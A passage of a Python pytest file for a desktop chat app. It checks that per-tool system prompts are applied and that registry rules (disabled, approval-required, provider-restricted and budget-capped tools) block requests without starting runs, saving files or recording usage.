        turn(restarted, "two", "b")
        assert len(usage_rows(project=projects.a)) == 2


# ── Tools through the request guard ─────────────────────────────────────────

@contextlib.contextmanager
def tool_row(name, **columns):
    """Change one row of the shared `tools` table, and put it back afterwards."""
    with get_connection() as conn:
        original = dict(conn.execute("SELECT * FROM tools WHERE name = ?", (name,)).fetchone())
    try:
        with get_connection() as conn:
            for column, value in columns.items():
                conn.execute(f"UPDATE tools SET {column} = ? WHERE name = ?", (value, name))
            conn.commit()
        yield
    finally:
        with get_connection() as conn:
            for column, value in original.items():
                conn.execute(f"UPDATE tools SET {column} = ? WHERE name = ?", (value, name))
            conn.commit()


def tool_names(win):
    return [win.tool_box.itemText(i) for i in range(win.tool_box.count())]


class TestChatTools:
    def test_positive_every_listed_tool_sends_its_own_system_prompt_and_logs_its_name(self, win, env):
        names = tool_names(win)
        assert {"General Chat", "Writing", "Coding", "Summarize", "Rewrite"} <= set(names)
        for name in names:
            win.new_chat()
            win.tool_box.setCurrentText(name)
            worker = send(win, f"use {name}")
            assert worker.messages[0] == {"role": "system", "content": win.tool_prompts[name]["system"]}
            assert run_row(win.active_run_id)["tool"] == name
            worker.finish("done")

    def test_positive_switching_tool_mid_conversation_replaces_the_system_prompt_only(self, win, env):
        win.tool_box.setCurrentText("Writing")
        turn(win, "draft this", "drafted")
        win.tool_box.setCurrentText("Coding")
        worker = send(win, "now code")
        system = [m for m in worker.messages if m["role"] == "system"]
        assert len(system) == 1 and system[0]["content"] == win.tool_prompts["Coding"]["system"]
        assert "draft this" in " ".join(m["content"] for m in worker.messages)

    def test_invalid_a_tool_name_not_in_the_registry_is_blocked(self, win, env):
        win.tool_box.addItem("Ghost tool")
        win.tool_box.setCurrentText("Ghost tool")
        runs = run_count()
        assert send(win, "hello") is None
        assert "Ghost tool" in env.dialogs.warnings[-1][1] and "disabled" in env.dialogs.warnings[-1][1]
        assert run_count() == runs and saved(env) == []

    @pytest.mark.parametrize("columns,expected", [
        ({"enabled": 0}, "disabled in the registry"),
        ({"requires_approval": 1}, "requires manual approval"),
        ({"allowed_providers": '["openai"]'}, "does not permit provider 'ollama'"),
    ])
    def test_denied_a_tool_the_registry_forbids_starts_no_worker_run_file_or_bill(
            self, win, env, columns, expected):
        runs, rows = run_count(), usage_count()
        with tool_row("Writing", **columns):
            win.tool_box.setCurrentText("Writing")
            assert send(win, "write something") is None
            assert expected in env.dialogs.warnings[-1][1]
        assert run_count() == runs and usage_count() == rows and saved(env) == []

    def test_denied_a_per_tool_budget_cap_blocks_a_paid_request_before_the_prompt(self, win, env):
        use_cloud(win)
        env.dialogs.answer = QMessageBox.Yes
        with tool_row("Writing", budget_limit_eur=0.000000001):
            win.tool_box.setCurrentText("Writing")
            assert send(win, "write a long essay " * 20) is None
        assert "budget cap" in env.dialogs.warnings[-1][1]
        assert saved(env) == []

    def test_cancel_after_a_blocked_request_the_window_is_not_stuck(self, win, env):
        with tool_row("Writing", enabled=0):
            win.tool_box.setCurrentText("Writing")
            assert send(win, "blocked") is None
        assert win.send_btn.isEnabled() and not win.send_btn.isHidden()
        win.tool_box.setCurrentText("General Chat")
        assert send(win, "allowed now") is not None

    def test_persist_a_tool_disabled_in_the_registry_is_absent_after_a_restart(self, win, env, make_window):
        assert "Rewrite" in tool_names(win)
        with tool_row("Rewrite", enabled=0):
            restarted = make_window()
            assert "Rewrite" not in tool_names(restarted)
            assert "Rewrite" not in restarted.tool_prompts
        assert "Rewrite" in tool_names(make_window())
